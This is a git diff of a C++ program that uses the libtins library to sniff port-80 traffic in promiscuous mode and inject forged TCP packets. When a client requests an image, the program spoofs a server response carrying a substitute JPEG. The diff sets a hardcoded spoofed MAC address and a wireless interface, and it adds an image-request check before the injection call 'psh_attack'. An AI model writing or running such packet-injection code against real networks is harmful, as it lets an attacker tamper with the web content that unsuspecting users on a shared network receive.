@@ -6,10 +6,10 @@
 #include <regex>
 using namespace Tins;
 using namespace std;
-
-
+string mac = "24:05:0f:30:ad:6b";
 struct pk_set
 {
+    typedef HWAddress<6> address;
     EthernetII new_ethernet;
     IP new_ip;
     TCP new_tcp;
@@ -55,21 +55,20 @@ struct pk_set
         config.set_promisc_mode(true);
         config.set_filter("port 80");
         config.set_promisc_mode(true);
-        config.set_timeout(-1);
-        Sniffer sniffer("eth0", config);
+        config.set_timeout(0.001);
+        Sniffer sniffer("tap0", config);
         sniffer.sniff_loop(make_sniffer_handler(this, &pk_set::handle));
     }
 
     void debug(EthernetII ethernet, IP ip, TCP tcp)
     {
         cout<<"ethernet<src /dst> :"<<hex<<ethernet.src_addr()<<" / "<<ethernet.dst_addr()<<"\n";
-        cout<<"IP src<src /dst> :"<<hex<<ip.src_addr()<<" / "<<ip.dst_addr()<<"\n";
+        cout<<"IP src<src /dst> :"<<dec<<ip.src_addr()<<" / "<<ip.dst_addr()<<"\n";
         cout<<"IP Check sum : "<<ip.checksum()<<"\n";
         cout<<"Tcp port<src /dst> :"<<hex<<tcp.sport()<<" / "<<tcp.dport()<<"\n";
         cout<<"tcp.seq num : "<<hex<<tcp.seq()<<"\n";
         cout<<"tcp.ack num : "<<hex<<tcp.ack_seq()<<"\n";
         cout<<"tcp offset : "<<tcp.flags()<<"\n";
-        //view macro
         cout<<"tcp ack : "<<tcp.ACK<<"\n";
         cout<<"tcp psh : "<<tcp.PSH<<"\n";
         cout<<"tcp Check sum :"<<tcp.checksum()<<"\n";
@@ -79,7 +78,7 @@ struct pk_set
     {
 
         //swap
-        new_ethernet.src_addr(ethernet.dst_addr());
+        new_ethernet.src_addr(address(mac));
         new_ethernet.dst_addr(ethernet.src_addr());
         //swap
         new_ip.src_addr(ip.dst_addr());
@@ -91,7 +90,6 @@ struct pk_set
         new_tcp.flags(0x18);
         return true;
     }
-
     void tcp_caculator(TCP tcp,uint32_t payload_len)
     {
         new_seq = tcp.ack_seq(); // caclulator
@@ -99,43 +97,36 @@ struct pk_set
         new_tcp.seq(new_seq);
         new_tcp.ack_seq(new_ack);
     }
-
     void chg_send()
     {
-        fprintf(stderr, "bef sending 111\n");
-        EthernetII psh_attack = new_ethernet / new_ip / new_tcp /RawPDU("HTTP/1.1 200 OK\r\nContent-Type: image/jpeg\nContent-Length: 1221\n\n") / RawPDU((const uint8_t *)image,len);
-        sender.send(psh_attack, "eth0");
-        fprintf(stderr, "Attack..");
-        cout<<"send Debug\n";
+        EthernetII psh_attack = new_ethernet / new_ip / new_tcp/RawPDU("HTTP/1.1 200 OK\r\nContent-Type: image/jpeg\nContent-Length: 1448\n\n")/RawPDU((const uint8_t *)image,len);
+        sender.send(psh_attack, "wlx24050f30ad6b");
         debug(new_ethernet,new_ip,new_tcp);
     }
-
     bool handle(PDU& pdu)
     {
         const EthernetII &ethernet = pdu.rfind_pdu<EthernetII>();
         const IP &ip = pdu.rfind_pdu<IP>();
         const TCP &tcp = pdu.rfind_pdu<TCP>();
         const RawPDU& raw = tcp.rfind_pdu<RawPDU>();
-        if(tcp.ACK == 0x10 && tcp.PSH == 0x08 && tcp.dport() == 0x50)
+        const RawPDU::payload_type& payload = raw.payload();
+        pk_swap(ethernet,ip,tcp);
+        if(tcp.ACK == 0x10 && tcp.PSH == 0x08 && tcp.dport() == 0x50 && web_image((char *)payload.data()) == true)
         {
-            const RawPDU::payload_type& payload = raw.payload();
-            //if(web_image((char *)payload.data()))
-            //{
-            pk_swap(ethernet,ip,tcp);
             tcp_caculator(tcp,payload.size());
             chg_send();
             cout<<"request packet "<<"\n";
-            cout<<payload.data()<<"\n";
             debug(ethernet,ip,tcp);
-            //}
+            cout<<payload.data()<<"\n";
         }
         return true;
     }
-};
-
-int main()
-{
+    };
+//problem : speed.....
+    int main()
+    {
     pk_set ps;
     ps.image_f();
     ps.sf_set();
-}
+    }
+
